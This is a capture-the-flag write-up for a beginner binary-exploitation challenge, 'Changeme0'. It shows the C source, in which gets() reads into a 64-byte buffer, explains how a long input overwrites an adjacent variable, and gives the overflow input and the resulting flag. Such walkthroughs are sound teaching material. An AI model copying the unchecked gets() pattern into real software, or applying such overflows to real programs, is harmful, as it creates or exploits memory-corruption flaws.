# [Pwn] Changeme0

## 💡 Challenge Description

> *I've been the same variable my whole life.. I need to change!*

## 🔒 ELF Properties

```
rydzze ~ ❯ file changeme0
changeme0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=7f620dc42e060a4b2dab0be42bfffbdfa5403caf, for GNU/Linux 3.2.0, with debug_info, not stripped

rydzze ~ ❯ checksec --file=changeme0
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   40 Symbols        No    0               2               changeme0
```

## ✨ Walkthrough

```c
int main(int argc, char **argv) {
	volatile int changeme;
	char buffer[64];

	changeme = 0;
	gets(buffer);

	if(changeme != 0) {
		printf("Thank you for changing me!\n");
		char buf[64];
		FILE *fptr = fopen("flag.txt", "r");
		fgets(buf, 64, fptr);
		printf("%s\n", buf);
		fflush(stdout);
	}
	else {
		printf("I\'m still the same.. try again?\n");
	}

	exit(0);
}
```

The binary contains a **stack-based buffer overflow vulnerability** due to the use of the unsafe `gets()` function, which reads input into a **64-byte buffer** without performing bounds checking. A variable named `changeme` is placed in memory directly after this buffer and is initially set to `0`. After receiving input, the program checks the value f `changeme`. If it remains `0`, the program displays a **failure message**; however, if `changeme` is **modified to any non-zero** value, the binary opens `flag.txt`, reads its contents, and prints the flag.

Since `gets()` does not restrict the input size, providing more than 64 bytes causes the input to overflow into the memory region where `changeme` is stored, allowing the binary’s logic to be redirected to the success path and revealing the flag.

## 🛠 Exploit

```
rydzze ~ ❯ ./changeme0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thank you for changing me!
sunctf25{D1d_u_5cr3am?8724923}
```

## 🏳️ Flag

`sunctf25{D1d_u_5cr3am?8724923}`